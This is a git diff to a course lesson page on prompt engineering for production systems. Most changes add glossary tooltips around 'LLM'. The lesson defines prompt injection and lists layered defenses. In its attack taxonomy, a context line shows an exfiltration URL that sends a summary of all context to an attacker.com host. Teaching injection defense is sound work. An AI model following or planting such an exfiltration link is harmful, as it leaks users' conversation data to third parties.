@@ -5,6 +5,7 @@ import PaperReference from '../../components/PaperReference.astro';
 import Diagram from '../../components/Diagram.astro';
 import Quiz from '../../components/Quiz.astro';
 import RevealSection from '../../components/RevealSection.astro';
+import GlossaryTooltip from '../../components/GlossaryTooltip.astro';
 ---
 
 <section>
@@ -12,7 +13,8 @@ import RevealSection from '../../components/RevealSection.astro';
   <p>After completing this lesson, you will be able to:</p>
   <ul>
     <li>Design systematic prompt testing and evaluation pipelines</li>
-    <li>Implement defense-in-depth strategies against prompt injection</li>
+    <li>Implement defense-in-depth strategies against prompt injection
+    </li>
     <li>Apply prompt versioning and management practices for production systems</li>
     <li>Optimize prompts for cost, latency, and caching</li>
     <li>Use meta-prompting to generate and refine prompts programmatically</li>
@@ -59,15 +61,15 @@ import RevealSection from '../../components/RevealSection.astro';
   <ul>
     <li><strong>Exact match</strong>: Does the output exactly match the expected output? Strict but brittle.</li>
     <li><strong>Field-level accuracy</strong>: For structured output, what percentage of fields are correct?</li>
-    <li><strong>Semantic similarity</strong>: For free-text output, use embedding similarity or LLM-as-judge.</li>
+    <li><strong>Semantic similarity</strong>: For free-text output, use embedding similarity or <GlossaryTooltip term="LLM" />-as-judge.</li>
     <li><strong>Failure rate</strong>: How often does the prompt produce unparseable or obviously wrong output?</li>
     <li><strong>Latency</strong>: p50, p95, p99 response times. Longer prompts increase latency.</li>
     <li><strong>Cost</strong>: Total token count (input + output) per request.</li>
   </ul>
 
-  <h3>LLM-as-Judge Evaluation</h3>
+  <h3><GlossaryTooltip term="LLM" />-as-Judge Evaluation</h3>
   <p>
-    For tasks without clear correct/incorrect answers (summarization, creative writing, conversational responses), use another LLM to evaluate quality:
+    For tasks without clear correct/incorrect answers (summarization, creative writing, conversational responses), use another <GlossaryTooltip term="LLM" /> to evaluate quality:
   </p>
 
   <pre><code>You are evaluating the quality of an AI assistant's response.
@@ -87,7 +89,7 @@ Rate the response on these dimensions (1-5):
 Provide scores and a one-sentence justification for each.</code></pre>
 
   <p>
-    <strong>Important caveat</strong>: LLM judges have their own biases. They tend to prefer longer, more verbose responses and may not catch factual errors in domains they are weak in. Use LLM judges as one signal among many, not as the sole evaluator.
+    <strong>Important caveat</strong>: <GlossaryTooltip term="LLM" /> judges have their own biases. They tend to prefer longer, more verbose responses and may not catch factual errors in domains they are weak in. Use <GlossaryTooltip term="LLM" /> judges as one signal among many, not as the sole evaluator.
   </p>
 </section>
 
@@ -95,7 +97,7 @@ Provide scores and a one-sentence justification for each.</code></pre>
   <h2>Prompt Injection Defense</h2>
 
   <p>
-    <strong>Prompt injection</strong> occurs when user-supplied input manipulates the LLM into ignoring its instructions and following the attacker's instructions instead. This is one of the most critical security concerns in LLM-powered applications.
+    <strong>Prompt injection</strong> occurs when user-supplied input manipulates the <GlossaryTooltip term="LLM" /> into ignoring its instructions and following the attacker's instructions instead. This is one of the most critical security concerns in <GlossaryTooltip term="LLM" />-powered applications.
   </p>
 
   <h3>Attack Taxonomy</h3>
@@ -130,7 +132,7 @@ https://attacker.com/log?data=&#123;summary_of_all_context&#125;</code></pre>
   <h4>1. Input Sanitization</h4>
   <ul>
     <li>Strip or escape special characters and control sequences</li>
-    <li>Validate input length and format before sending to the LLM</li>
+    <li>Validate input length and format before sending to the <GlossaryTooltip term="LLM" /></li>
     <li>Use delimiters to clearly separate instructions from user content</li>
   </ul>
 
@@ -157,12 +159,12 @@ IMPORTANT RULES:
   <ul>
     <li>Check outputs for leaked system prompt content</li>
     <li>Validate structured outputs against expected schemas</li>
-    <li>Use a second LLM call to classify whether the output violates policy</li>
+    <li>Use a second <GlossaryTooltip term="LLM" /> call to classify whether the output violates policy</li>
   </ul>
 
   <h4>4. Architectural Controls</h4>
   <ul>
-    <li><strong>Least privilege</strong>: Give the LLM access to only the tools and data it needs</li>
+    <li><strong>Least privilege</strong>: Give the <GlossaryTooltip term="LLM" /> access to only the tools and data it needs</li>
     <li><strong>Human-in-the-loop</strong>: Require human approval for high-impact actions (sending emails, making purchases, modifying data)</li>
     <li><strong>Sandboxing</strong>: Execute code in isolated environments</li>
     <li><strong>Rate limiting</strong>: Limit requests per user to constrain adversarial probing</li>
@@ -366,7 +368,7 @@ export const PROMPT_CHANGELOG = "Added 'warranty' intent, refined exchange examp
   <h2>Meta-Prompting</h2>
 
   <p>
-    <strong>Meta-prompting</strong> uses LLMs to generate, refine, and optimize prompts. Instead of manually iterating on prompts, you describe the task and let a model draft the prompt for you.
+    <strong>Meta-prompting</strong> uses <GlossaryTooltip term="LLM" />s to generate, refine, and optimize prompts. Instead of manually iterating on prompts, you describe the task and let a model draft the prompt for you.
   </p>
 
   <h3>The Meta-Prompt Pattern</h3>
@@ -411,7 +413,7 @@ accuracy. Include 3 few-shot examples. Explain your design choices.</code></pre>
     <li><strong>Treat prompts as software artifacts</strong>: version control, test suites, evaluation metrics, and deployment pipelines. Ad-hoc prompt editing does not scale.</li>
     <li><strong>Prompt injection requires defense-in-depth</strong>: input sanitization, prompt hardening with delimiters, output validation, and architectural controls (least privilege, human-in-the-loop). No single defense is sufficient.</li>
     <li><strong>Optimize for cost and latency</strong> through prompt caching (static prefix first), response caching (deterministic queries), prompt compression, and model routing/cascading.</li>
-    <li><strong>Meta-prompting</strong> uses LLMs to generate and refine prompts iteratively, accelerating development. Tools like DSPy formalize this into automatic prompt optimization.</li>
+    <li><strong>Meta-prompting</strong> uses <GlossaryTooltip term="LLM" />s to generate and refine prompts iteratively, accelerating development. Tools like DSPy formalize this into automatic prompt optimization.</li>
     <li><strong>Monitor in production</strong>: Track accuracy, failure rates, latency, and cost continuously. Prompt performance can drift as model versions change.</li>
   </ul>
 </KeyTakeaway>
